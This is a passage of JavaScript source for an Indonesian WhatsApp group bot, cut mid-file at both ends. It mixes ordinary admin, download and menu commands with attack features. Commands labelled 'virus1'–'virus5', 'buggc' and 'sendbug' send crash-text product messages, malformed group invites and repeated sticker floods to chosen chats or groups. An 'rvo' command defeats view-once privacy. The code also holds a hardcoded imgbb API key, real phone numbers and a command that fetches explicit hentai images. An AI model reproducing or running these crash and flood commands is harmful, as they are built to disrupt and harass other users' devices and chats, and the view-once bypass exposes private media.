	case 'autovn':
if (!mek.key.fromMe) return reply('Khusus Owner')
if (args.length < 1) return reply(`Penggunaan ${prefix}autorespon on/off`)
if (q === 'on'){
autovn = false
reply(`Berhasil mengaktifkan autovn`)
} else if (q === 'off'){
autovn = true
reply(`Berhasil menonaktifkan autovn`)
} else {
reply(mess.error.api)
}
break
case 'bc':
case 'broadcast':
					if (!mek.key.fromMe) return reply('*Kamu Owner?_*')
					if (args.length < 1) return reply('.......')
					anu = await hexa.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await hexa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Will.sendMessage(_.jid, bc, image, {quoted:will,caption: `*「 Will Ft RosaBot BROADCAST 」*\n\n${body.slice(4)}`})
						}
						reply('Suksess broadcast')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `*「 Will Ft RosaBot BROADCAST 」*\n\n${body.slice(4)}`)
						}
						reply('Suksess broadcast')
					}
					break
	
	case 'setprefix':
	prefix = q
	reply('Prefix berhasil diubah menjadi: ' + q ? q : 'No prefix')
	break
    case 'jadibot':
    if(mek.key.fromMe) return reply('Tidak bisa jadibot di dalam bot')
    jadibot(reply,hexa,from)
    break
    case 'stopjadibot':
    if(!isOwner)return reply('tidak bisa stopjadibot kecuali owner')
    stopjadibot(reply)
    break
    case 'listbot':
    let tekss = '「 *LIST JADIBOT* 」\n'
    for(let i of listjadibot) {
    tekss += `*Nomor* : ${i.jid.split('@')[0]}
*Nama* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`
    }
    reply(tekss)
    break
case 'addcmd':
case 'setcmd':
if (!isOwner) return reply('Kamu Bukan Owner') 
if (isQuotedSticker) {
	if (!q) return reply(`Penggunaan : ${prefix+command} cmdnya dan tag stickernya`)
	kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
	addCmd(kodenya, q);
	reply('Sukses')
} else {
	reply('tag stickenya')
}
break
case 'sendbug':
if (!q) return reply(`Example ${prefix + command} id grup|teks`)
target = q.split('|')[0]
teks = q.split('|')[1]
await sendbug(target, teks)
reply('Sukses')
break
case 'delcmd':
if (!isOwner) return reply('Kamu Bukan Owner') 
if (!isQuotedSticker) return reply(`Penggunaan : ${prefix+command} tagsticker`)
kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
_scommand.splice(getCommandPosition(kodenya), 1)
fs.writeFileSync('./scommand.json', JSON.stringify(_scommand))
reply('Sukses')
break
case 'antilink':
			if (!isOwner) return reply(from, 'ANDA BUKAN OWNER', mek)
			if (!isGroupAdmins) return xznsenpai.reply(from, 'anda bukan admin', mekl)
				if (!isBotGroupAdmins) return reply(from, 'Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Ini', mek)
					if (Number(args[0]) === 1) {
						if (isAntiLink) return reply(from, 'sdh aktif', mek)
						antilink.push(from)
						fs.writeFileSync('./lib/antilink.json', JSON.stringify(antilink))
						reply('*   ACTIVATED ANTILINK*')
					} else if (Number(args[0]) === 0) {
						antilink.splice(from, 1)
						fs.writeFileSync('./lib/antilink.json', JSON.stringify(antilink))
						reply('*   DEACTIVATED ANTILINK*')
					} else {
						
					}
					break
case 'add1':
					if (!isGroup) return reply(mess.only.group)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('𝗽𝗮𝘀𝘁𝗶 𝘆𝗮𝗻𝗴 𝗺𝗮𝘂 𝗱𝗶 𝗮𝗱𝗱 𝗮𝗻𝗮𝗸 𝗽𝘂𝗻𝗴𝘂𝘁?')
					if (args[0].startsWith('08')) return reply('𝗚𝘂𝗻𝗮𝗸𝗮𝗻 𝗸𝗼𝗱𝗲 𝗻𝗲𝗴𝗮𝗿𝗮')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						hexa.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('𝗴𝗮𝗴𝗮𝗹 𝗺𝗲𝗻𝗮𝗺𝗯𝗮𝗵𝗸????, 𝗺𝘂𝗻𝗴𝗸𝗶𝗻 𝗸𝗮𝗿𝗲𝗻𝗮 𝗱𝗶 𝗽𝗿𝗶𝘃𝗮𝘁𝗲')
					}
					break
					
                        case 'google': {
					let googleIt = require('google-it')
					if (!q) return reply('Cari apa?')
					reply(mess.wait)
					let url = 'https://google.com/search?q=' + encodeURIComponent(q)
					let data = await googleIt({ query: q, disableConsole: true })
					let txt = data.map(({ title, link, snippet }) => {
						return `*${title}*\n_${link}_\n_${snippet}_`
					}).join`\n\n`
					await reply(url + '\n\n' + txt)
					break
				}
				case 'afk':
                    alasan = args.join(" ")
                    mati[sender.split('@')[0]] = alasan.toLowerCase()
                    fs.writeFileSync("./lib/afk.json", JSON.stringify(mati))
                    ini_mn1k = "Anda telah afk\n\n"
                    if (alasan != "") {
                        ini_mn1k += "Dengan alasan :"  + alasan
                    }
                    reply(ini_mn1k)
                    break
case 'welcome':
				if (!mek.key.fromMe && !isGroupAdmins) return reply(mess.only.owner)
		if (args.length < 1) return reply(`Ketik ${prefix + command} nyala/mati`)
					if ((args[0]) === '1') {
						if (isWelkom) return reply('udah nyala')
						welkom.push(from)
						fs.writeFileSync('./lib/welkom.json', JSON.stringify(welkom))
						reply(`\`\`\`✓Sukses mengaktifkan fitur di group\`\`\` *${groupMetadata.subject}*`)
					} else if ((args[0]) === '0') {
						if (!isWelkom) return reply('udah mati')
						welkom.splice(from, 1)
						fs.writeFileSync('./lib/welkom.json', JSON.stringify(welkom))
						reply(`\`\`\`✓Sukses menonaktifkan fitur di group\`\`\` *${groupMetadata.subject}*`)
					} else {
						reply('nyala untuk mengaktifkan, mati untuk menonaktifkan')
					}
					break
case 'will':
reply('Cara Hubungi Owner Dengan Gmail Disini WilliamXixi@yandex.com')
break
case 'testmenu':
menunya= `Belon Ada`
send3ButtonImg('Liat Bawah Menunya', 'https://telegra.ph/file/2a9ab8db93a88f502b37f.jpg', menunya, `Klik Untuk Buka Menu`, `${prefix}menu`, 'Klik Jika Menu 1 Sudah Diklik',`${prefix}menu`,'Cek Ping',`${prefix}ping`,{thumbnail: fs.readFileSync('./stik/thumb.jpeg'), quoted:ftroli, contextInfo: { forwardingScore: 250, isForwarded: true,  externalAdReply: { title: 'Will-Awikwok', body: '𐎑⃢BY;🇮🇩Will🇮🇩☙', sourceUrl: `https://wa.me/c/6283870005811`, thumbnail: fs.readFileSync('./stik/thumb.jpeg')}}})
break
case 'menutest':
menunya = `Mana Gak ada`
send2ButtonImg('Liat Bawah Menunya', 'https://telegra.ph/file/2a9ab8db93a88f502b37f.jpg', menunya, `Klik Untuk Buka Menu`, `${prefix}menu`, 'Klik Jika Menu 1 Sudah Diklik',`${prefix}menu`,{thumbnail: fs.readFileSync('./stik/thumb.jpeg'), quoted:ftroli, contextInfo: { forwardingScore: 250, isForwarded: true,  externalAdReply: { title: 'Will-Awikwok', body: '𐎑⃢BY;🇮🇩Will🇮🇩☙', sourceUrl: `https://wa.me/c/6283870005811`, thumbnail: fs.readFileSync('./stik/thumb.jpeg')}}})
break
case 'menutest1':
const testmenua = `test`
const testmenui = `teksbawah`
hexa.sendMessage(mek.key.remoteJid, { contentText: 'teks atas', footerText: 'teks bawah', buttons: [{ buttonId: '/ping', buttonText: { displayText: 'Ping' }, type: 1 }, { buttonId: '/sc', buttonText: { displayText: 'Source Code' }, type: 1}], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: fs.readFileSync('fake.jpeg') }}, 'buttonsMessage')
break
case 'temst':
hexa.sendMessage(mek.key.remoteJid, { contentText: 'teks atas', footerText: 'teks bawah', buttons: [{ buttonId: '/ping', buttonText: { displayText: 'Ping' }, type: 1 }, { buttonId: '/sc', buttonText: { displayText: 'Source Code' }, type: 1}], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: fs.readFileSync('fake.jpeg') }}, 'buttonsMessage')
break
case 'menu':
    case 'help':
    	const lol = fs.readFileSync(`./stik/fake.jpeg`)
const help999 = `Prefix : 「 MULTI-PREFIX 」

Author = Hexagon

Owner = Ocaa && Will

Hi = ${ucapanWaktu} ${pushname} @${sender.split('@')[0]}  


╭──(>>Setting Group Buka/Tutup<<)
│► _${prefix}group open
│► _${prefix}group close
╰───────────────────

╭──(>>>>>>Other Menu<<<<<<)
│► _${prefix}afk <alasan>
│► _${prefix}kick <reply pesannya>
│► _${prefix}add <reply pesannya>
│► _${prefix}promote <reply pesannya>
│► _${prefix}demote <reply pesannnya>
│► _${prefix}kick1 <Tag Membernya>
│► _${prefix}add1 <Tag Membernya>
╰───────────────────

╭──(>>>>>>Khusus Owner Bot<<<<<<)
│ *</OWNER>*
│► _${prefix}off_<untuk Off Owner>
│► _${prefix}on_<Untuk On Bot>
│► _${prefix}broadcast <textnya>
│► _${prefix}antilink <1/0>
│► _${prefix}welcome <1/0>
│► _${prefix}status_
╰───────────────────

╭──(>>>>>>Maker<<<<<<)
│► _${prefix}sticker_
│► _${prefix}take_ <author|packname>
│► _${prefix}setexif_<untuk ubah wm sticker>
│► _${prefix}fdeface_
│► _${prefix}emoji_
╰───────────────────

╭──(>>>>>>Convert<<<<<<)
│► _${prefix}toimg_
│► _${prefix}slow_
│► _${prefix}fast_ 
│► _${prefix}reverse_
╰───────────────────

╭──(>>>>>>UP Status Owner<<<<<<)
│► _${prefix}upswteks_
│► _${prefix}upswimage_
│► _${prefix}upswvideo_
╰───────────────────

╭──(>>>>>>Tag Member<<<<<<)
│► _${prefix}hidetag_<Pesan Tag>
│► _${prefix}tagall_
│► _${prefix}kontag_ <Kontak Tag>
│► _${prefix}sticktag_ <Sticker Tag>
│► _${prefix}totag_<Reply Teks,Gambar,sticker,vn>
╰───────────────────

╭──(>>>>>>Download<<<<<<)
│► _${prefix}play_ <query>
│► _${prefix}video_ <query>
│► _${prefix}ytmp3_ <link>
│► _${prefix}ytmp4_ <link>
│► _${prefix}tiktok_ <link>
│► _${prefix}brainly_ <query>
│► _${prefix}pinterest_ <query>
╰───────────────────

╭──(>>>>>>Menu Lain<<<<<<)
│► _${prefix}self_<Mode Self>
│► _${prefix}public_<Mode Publik>
│► _${prefix}ping_ <Test kecepatan Bot>
│► _${prefix}inspect_<Lihat Group Orang Lain>
│► _${prefix}join_<Join Group Orang Lain>
│► _${prefix}caripesan_ <contoh Test|5>
│► _${prefix}term_ <code>
│► _x_ <code>
╰───────────────────

╭──(>>>>>>Coba Bot<<<<<<)
│► _${prefix}jadibot_
│► _${prefix}stopjadibot_
│► _${prefix}listbot_
╰───────────────────

╭──(>>>>>>Vote<<<<<<)
│► _${prefix}voting_
│► _${prefix}delvote_
│► _${prefix}vote_
│► _${prefix}devote_
╰───────────────────

Haram Menu 
#haram or #image
Kaborrrr

❏ *Will Ft Rosa* ❏`
fakebis = await getBuffer(`https://telegra.ph/file/346d52aa16a68d83f8787.jpg`) 
foto = await getBuffer(`https://telegra.ph/file/acd00c11f5d9ac03ce18d.jpg`)
thu = await getBuffer(`https://telegra.ph/file/efcacd74661a3b04ae19a.jpg`)
hexa.sendMessage(from, foto, image, {quoted : ftroli, thumbnail: thu, caption: `${help999}`, contextInfo: {mentionedJid: [sender], forwardingScore: 250, isForwarded: true,  externalAdReply: { title: 'Will Ft Rosa', body: 'Anu Bang', sourceUrl: `https://wa.me/c/6283870005811`, thumbnail: fakebis }}}) 
break 
case 'haram':
axios.get(`https://www.nekos.life/api/v2/img/hentai`).then(v => hexa.sendMessage(from, { url: v.data.url }, 'imageMessage', { quoted: qul, thumbnail: Buffer.alloc(0) }))
break
case 'image':
listnya = `Contoh Dan List\n\n #image yuri\n\nsolog\nsmug\nfeet\nsmallboobs\nlewdkemo\nwoof\ngasm\nsolo\n8ball\ngoose\ncuddle\navatar\ncum\nslap\nles\nv3\nerokemo\nbj\npwankg\nnekoapi_v3.1\nero\nhololewd\npat\ngecg\nholo\npoke\nfeed\nfox_girl\ntits\nnsfw_neko_gif\neroyuri\nholoero\npussy\nRandom_hentai_gif\nlizard\nyuri\nketa\nneko\nhentai\nfeetg\neron\nerok\nbaka\nkemonomimi\nhug\ncum_jpg\nnsfw_avatar\nerofeet\nmeow\nkiss\nwallpaper\ntickle\nblowjob\nspank\nkuni\nclassic\nwaifu\nfemdom\nboobs\ntrap\nlewd\npussy_jpg\nanal\nfutanari\nngif\nlewdk`
if (!q) return reply(listnya)
axios.get(`https://www.nekos.life/api/v2/img/${q}`).then(v => hexa.sendMessage(from, { url: v.data.url }, 'imageMessage', { quoted: qul, thumbnail: Buffer.alloc(0) }))
break
case 'listharga':
const help123 =`╭──(>>>>>>PERHATIAN<<<<<<)
│JANGAN SPAM BOT INI !!..
│
│_*SELAMAT DATANG BOSSKUU DI TOKO*_
│
│▬▬▬▬▬▬ஜ۩۞۩ஜ▬▬▬▬▬
│    🎖️ _*"𝕷𝖔𝖑𝖎𝖕𝖔𝖕 𝕾𝖙𝖔𝖗𝖊"*_🎖️
│▬▬▬▬▬▬ஜ۩۞۩ஜ▬▬▬▬▬
│    
│    °•∆•LIST HARGA CHIP•∆•°
│
│   🥇 _*KUNING / GOLD*_🥇
│
│•100M•  10.000      •600M• 40.000
│•200M• 15.000       •700M• 50.000
│•300M• 25.000       •800M• 55.000
│•400M• 30.000       •900M• 60.000
│•500M• 35.000       •1B• 65.000
│
│           🏅 _*UNGU*_ 🏅
│                •1B•67.000
│
│_*TERIMA BONGKARANG  X57-60*_
│
│💰 _PAYMENT BCA - DANA - OVO - GOPAY_💰
│
│▬▬▬▬▬▬▬ஜ۩۞۩ஜ▬▬▬▬▬▬▬▬
│_*Terimakasih Sudah Mampir / Bergabung*_🙏
│▬▬▬▬▬▬▬ஜ۩۞۩ஜ▬▬▬▬▬▬▬▬
│
│_*-Link Grub [ 1 ]*_
│https://chat.whatsapp.com/EHdCUyGylfy8PZCtlWADuX
│
│ _*-Link Grub [ 2 ]*_
│https://chat.whatsapp.com/KbUn3SIQAFg067kHYvv7Uu
│
╰───────────────────`
fakebis = await getBuffer(`https://telegra.ph/file/dc016db3a7044ecf16389.jpg`) 
foto = await getBuffer(`https://telegra.ph/file/e385143580759155e26cc.jpg`)
thu = await getBuffer(`https://telegra.ph/file/dc016db3a7044ecf16389.jpg`)
hexa.sendMessage(from, foto, image, {quoted : ftroli, thumbnail: thu, caption: `${help123}`, contextInfo: {mentionedJid: [sender], forwardingScore: 250, isForwarded: true,  externalAdReply: { title: 'Will Ft Rosa', body: 'Will && Ocaa', sourceUrl: `https://wa.me/c/6282289662946`, thumbnail: fakebis }}}) 
break
case 'tt':
if (!q) return fakegroup('Linknya?')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
reply(mess.wait)
await axios.get(`https://api-caliph.herokuapp.com/tiktod?apikey=beta&url=${args[0]}`).then(v => sendMediaURL(from, v.data.result.nowatermark)).catch(e => reply(String(e)))
break
case 'demote':
  if (!isGroup) return
  if (!isGroupAdmins) return reply(mess.only.admin)
  if (!isBotGroupAdmins) return reply(mess.only.Badmin)
  if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
    orang = args[0].replace(/\D/g, '') + '@s.whatsapp.net'
    mentions(`Sure,demote @${orang.split('@')[0]}`, orang, true)
     hexa.groupDemoteAdmin(from, [orang])
                        } else {
orang = mek.message.extendedTextMessage.contextInfo.participant || mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
mentions(`Sure, demote @${orang.split('@')[0]}`, orang, true)
hexa.groupDemoteAdmin(from, [orang])
                        } 
                    break
                    
case 'promote':
  if (!isGroup) return
  if (!isGroupAdmins) return reply(mess.only.admin)
  if (!isBotGroupAdmins) return reply(mess.only.Badmin)
  if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
    orang = args[0].replace(/\D/g, '') + '@s.whatsapp.net'
    mentions(`Sure, promote @${orang.split('@')[0]}`, orang, true)
      hexa.groupMakeAdmin(from, [orang])
                        } else {
orang = mek.message.extendedTextMessage.contextInfo.participant || mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
mentions(`Sure, promote @${orang.split('@')[0]}`, orang, true)
hexa.groupMakeAdmin(from, [orang])
                        } 
                    break
case 'add':
  if (!isGroup) return
  if (!isGroupAdmins) return reply(mess.only.admin)
  if (!isBotGroupAdmins) return reply(mess.only.Badmin)
  if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
    orang = args[0].replace(/\D/g, '') + '@s.whatsapp.net'
    mentions(`Sure, Add @${orang.split('@')[0]}`, orang, true)
      hexa.groupAdd(from, [orang])
                        } else {
orang = mek.message.extendedTextMessage.contextInfo.participant || mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
mentions(`Sure, kick @${orang.split('@')[0]}`, orang, true)
hexa.groupAdd(from, [orang])
                        } 
                    break
           	case 'kick':
  if (!isGroup) return
  if (!isGroupAdmins) return reply(mess.only.admin)
  if (!isBotGroupAdmins) return reply(mess.only.Badmin)
  if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
    orang = args[0].replace(/\D/g, '') + '@s.whatsapp.net'
    mentions(`Sure, kick @${orang.split('@')[0]}`, orang, true)
      hexa.groupRemove(from, [orang])
                        } else {
orang = mek.message.extendedTextMessage.contextInfo.participant || mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
mentions(`Sure, kick @${orang.split('@')[0]}`, orang, true)
hexa.groupRemove(from, [orang])
                        } 
                    break
                    case 'kick1':
					if (!isGroup) return reply(mess.only.group)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('𝗽𝗮𝘀𝘁𝗶 𝘆𝗮𝗻𝗴 𝗺𝗮𝘂 𝗱𝗶 𝗮𝗱𝗱 𝗮𝗻𝗮𝗸 𝗽𝘂𝗻𝗴𝘂𝘁?')
					if (args[0].startsWith('08')) return reply('𝗚𝘂𝗻𝗮𝗸𝗮𝗻 𝗸𝗼𝗱𝗲 𝗻𝗲𝗴𝗮𝗿𝗮')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						hexa.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('error')
					}
					break
case 'virus5':
			      case 'buggc':
if (!mek.key.fromMe) return reply('「 *KHUSUS OWNER LU SIAPA?* 」')
					hexa.toggleDisappearingMessages(from, "0")
					break
case 'virus3':
const keywill = fs.readFileSync(`./stik/fake.jpeg`)
hexa.sendMessage(from, keywill, image, { quoted: tromli, caption: virtex()})
break
case 'virus4':
				if (!mek.key.fromMe) return reply('Owner bukan?')
const stikernyak = fs.readFileSync(`Will.webp`)
hexa.sendMessage(from, stikernyak, sticker, {quoted:tromli })
hexa.sendMessage(from, stikernyak, sticker, {quoted:tromli })
hexa.sendMessage(from, stikernyak, sticker, {quoted:tromli })
hexa.sendMessage(from, stikernyak, sticker, {quoted:tromli })
hexa.sendMessage(from, stikernyak, sticker, {quoted:tromli })
hexa.sendMessage(from, stikernyak, sticker, {quoted:tromli })
hexa.sendMessage(from, stikernyak, sticker, {quoted:tromli })
hexa.sendMessage(from, stikernyak, sticker, {quoted:tromli })
hexa.sendMessage(from, stikernyak, sticker, {quoted:tromli })
hexa.sendMessage(from, stikernyak, sticker, {quoted:tromli })
hexa.sendMessage(from, stikernyak, sticker, {quoted:tromli })
hexa.sendMessage(from, stikernyak, sticker, {quoted:tromli })
break
case 'memegen':
                     top = q.split('|')[0]
                     bottom = q.split('|')[1]
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
					ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					owgi = await  hexa.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("f0b190d67308d34811fab9c56fe8aba7", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
					sendMediaURL(from, `${anu1}`, mess.success)
					} else {
					reply('Gunakan foto/stiker!')
					}
					break
case 'size':

if (!q || isNaN(q)) return reply('Masukan angkanya')
data = await hexa.prepareMessageFromContent(from, {

stickerMessage: {

url: mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.url,

fileSha256: mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64'),

fileEncSha256: mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileEncSha256.toString('base64'),

mediaKey: mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.mediaKey.toString('base64'),

mimetype: mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.mimetype,

height: mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.height,

width: mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.width,

directPath: mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.directPath,

fileLength: q,

mediaKeyTimestamp: mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.mediaKeyTimestamp.low,

isAnimated: mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated

}

}, {quoted:mek})

hexa.relayWAMessage(data)
break
case 'virus1':
               hmm4 = fs.readFileSync(`./stik/fake.jpeg`)
               imeu = await hexa.prepareMessage('0@s.whatsapp.net', hmm4, image)
               imeg = imeu.message.imageMessage
               res = await hexa.prepareMessageFromContent(from,{
               "productMessage": {
               "product": {
               "productImage": imeg,
               "productId": "9999999999",
               "jpegThumbnail": fs.readFileSync('./stik/fake.jpeg'),
                "title": "Will Ft Rosa",
                "description": virtex(),
                //"currencyCode": "USD",
				//"priceAmount1000": "999999999",
				"retailerId": virtex(),
                "descriptionCount": "999999999",
                "productImageCount": "1",
                 },
                "businessOwnerJid": "6282289662946@s.whatsapp.net",
                "contextInfo": {
                "forwardingScore": 9999,
                "isForwarded": true
                }
               }
              }, {quoted: mek})
                  hexa.relayWAMessage(res)
                  break
case 'listgroup':
  if(!mek.key.fromMe) return
ingfoo = await getGroup(totalchat)
					teks1 = `*⬣ L I S T  G R O U P*\nJumlah Grup: ${ingfoo.length}\n\n`
   for (let i = 0; i < ingfoo.length; i++){
   teks1 += `⬡ Nama grup : ${ingfoo[i].subject}\n⬡ ID grup : ${ingfoo[i].id}\n⬡ Dibuat : ${moment(`${ingfoo[i].creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ Jumlah Peserta : ${ingfoo[i].participants.length}\n\n`
   }
   reply(teks1)
   break
case 'virus2':
				res = await hexa.prepareMessageFromContent(from, {
				             "groupInviteMessage": {
						"groupJid": "6283870005811-1625930113@g.us",
						"inviteCode": "2vHKzPXKy8aQAfey",
						"inviteExpiration": "1626322935",
						"groupName": `${virtex()}`, 
						"caption": "Gabung Gc Samya Bang"
					}, 
                "contextInfo": {
               "forwardingScore": 3,
               "isForwarded": true
                }
                }, {contextInfo:{}}) 
                hexa.relayWAMessage(res)
                break
    case 'delvote':
            if(!mek.key.remoteJid) return
            if(isVote) return reply('Tidak ada sesi Voting')
            delVote(from)
            reply('Sukses Menghapus sesi Voting Di Grup Ini')
            break
    case 'voting':
            if(!isGroupAdmins && !mek.key.fromMe) return 
            if(!isGroup) return reply(mess.only.group)
            if (isVote) return reply('Sesi Voting Sedang Berlangsung Di Grup Ini')
            if(!q) return reply('*Voting*\n\n'+ prefix+ 'voting @tag target | reason  | 1 (1 = 1 Menit)')
            if (mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || mek.message.extendedTextMessage.contextInfo == null) {
            let id = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            split = args.join(' ').replace('@', '').split('|')
            if(!Number(split[2])) return reply('masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit')
            await mentions('Vote ' +'@'+ id.split('@')[0]+' Di Mulai' +'\n\n' + `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,[id],true)
            addVote(from,split[1],split[0],split[2],reply)
            }
            break
            case 'setpp': 
case 'setppbot' :
            {
                if (!isOwner) return
                if (isQuotedImage) {
                    let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    let media = await hexa.downloadMediaMessage(encmedia)
                    hexa.updateProfilePicture(hexa.user.jid, media)
                    .then((res) => reply(jsonformat(res)))
					.catch((err) => reply(jsonformat(err)))
                } else {
                    reply(`Kirim gambar atau reply gambar dengan caption ${command}`)
                }
            }
                break
    case 'linkwa':
            if(!q) return reply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '*「 _LINK WA_ 」*\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break
case 'emoji':
			if (!q) return reply('emojinya?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[4].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
    case 'igstory': 
            if(!q) return reply('Usernamenya?')
            hx.igstory(q)
            .then(async result => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    hexa.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    hexa.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})                  
                }
            }
            });
            break
case 'listbug':
reply('bugtroli,bug biasa,slayer,virgam,tautan')
break
case 'rvo':
case 'readviewonce':
if (mek.message[type].contextInfo.quotedMessage.viewOnceMessage) {
	message = { ...mek }
	message.message = message.message.extendedTextMessage.contextInfo.quotedMessage.viewOnceMessage.message
	message.message[Object.keys(message.message)[0]].viewOnce = false
	hexa.forwardMessage(from, message)
} else {
	reply('Reply chat viewOnce!')
}
break
    case 'caripesan':
            if(!q)return reply('pesannya apa bang?')
            let v = await hexa.searchMessages(q,from,10,1)
            let s = v.messages
            let el = s.filter(v => v.message)
            el.shift()
            try {
            if(el[0].message.conversation == undefined) return
            reply(`Ditemukan ${el.length} pesan`)
            await sleep(3000)
            for(let i = 0; i < el.length; i++) {
            await hexa.sendMessage(from,'Nih pesannya',text,{quoted:el[i]})
            }
            } catch(e){
            reply('Pesan tidak ditemukan!')
            }           
            break
    case 'lirik':
            if(!q) return reply('lagu apa?')
            let song = await hx.lirik(q)
            sendMediaURL(from,song.thumb,song.lirik)
            break
    case 'otaku':
            if(!q) return reply('judul animenya?')
            let anime = await hx.otakudesu(q)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
            hexa.sendMessage(from,ram,image,{quoted:mek,caption:rem})
            break
    case 'komiku':
            if(!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`)
            let komik = await hx.komiku(q)
            result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
            sendMediaURL(from, komik.image,result)
            break
    case 'chara':
            if(!q) return reply(`gambar apa?\n${prefix}chara nino`)
            let im = await hx.chara(q)
            let acak = im[Math.floor(Math.random() * im.length)]
            let li = await getBuffer(acak)
            await hexa.sendMessage(from,li,image,{quoted: mek})
            break
    case 'pinterest':
            if(!q) return reply('gambar apa?')
            let pin = await hx.pinterest(q)
            let ac = pin[Math.floor(Math.random() * pin.length)]
            let di = await getBuffer(ac)
            await hexa.sendMessage(from,di,image,{quoted: mek})
            break
    case 'playstore':
            if(!q) return reply('lu nyari apa?')
            let play = await hx.playstore(q)
            let store = '❉─────────────────────❉\n'
            for (let i of play){
            store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`
            }
            reply(store)
            break
    case 'on':
            if (!mek.key.fromMe) return 
            offline = false
            fakestatus(' ```ANDA TELAH ONLINE``` ')
            break       
    case 'status':
            fakestatus(`*STATUS*\n${offline ? '> OFFLINE' : '> ONLINE'}\n${banChats ? '> SELF-MODE' : '> PUBLIC-MODE'}`)
            break
    case 'off':
            if (!mek.key.fromMe) return 
            offline = true
            waktu = Date.now()
            anuu = q ? q : '-'
            alasan = anuu
            fakestatus(' ```ANDA TELAH OFFLINE``` ')
            break   
    case 'get':
            if(!q) return reply('linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            fakestatus(bu)
            })   
            break
    case 'kontag':
            if (!mek.key.fromMe) return reply('SELF-BOT')
            pe = args.join('')
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            members_ids = []
            for (let mem of groupMembers) {
            members_ids.push(mem.jid)
            }
            vcard = 'BEGIN:VCARD\n'
